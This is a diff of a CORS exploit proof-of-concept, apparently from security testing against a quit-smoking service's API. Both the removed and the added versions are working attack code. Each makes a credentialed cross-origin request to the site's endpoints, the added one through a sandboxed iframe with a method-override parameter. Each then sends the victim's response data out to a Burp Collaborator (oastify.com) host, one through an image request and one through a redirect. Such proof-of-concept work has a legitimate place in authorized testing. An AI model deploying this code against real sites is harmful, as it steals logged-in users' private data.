@@ -1,27 +1,11 @@
-<!DOCTYPE html>
-<html>
-<head>
-    <script>
-        var req = new XMLHttpRequest();
-        req.onload = reqListener;
-        req.open('POST', 'https://quitplan.ycq2.org/api/cravings', true);
-        req.setRequestHeader('Content-Type', 'application/json');
-        req.withCredentials = true;
+<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html, <script>
+  var req = new XMLHttpRequest();
+  req.onload = reqListener;
+  req.open('get','https://quitplan.ycq2.org/api/slips?_method=PUT&time=Mon+Dec+23+2024+23%3a48%3a18+GMT-0800+%28Pacific+Standard+Time%29&note=&tz=-08%3a00&newTrigger=',true);
+  req.withCredentials = true;
+  req.send();
 
-        // Example POST payload (adjust as needed based on the API behavior)
-        var payload = JSON.stringify({ test: "value" });
-        req.send(payload);
-
-        function reqListener() {
-            console.log("Response received:", this.responseText);
-
-            // Send the response data to the Burp Collaborator server
-            var img = new Image();
-            img.src = 'https://1egmcv3607xvxukwq06jf8ix4oafy6rug.oastify.com/?data=' + encodeURIComponent(this.responseText);
-        }
-    </script>
-</head>
-<body>
-    <h1>POST Request CORS Exploit Page</h1>
-</body>
-</html>
+  function reqListener() {
+    location='https://mtjw95omqkjwlq048jw7otozvq1hpgd5.oastify.com/log?key='+encodeURIComponent(this.responseText);
+   };
+</script>"></iframe>
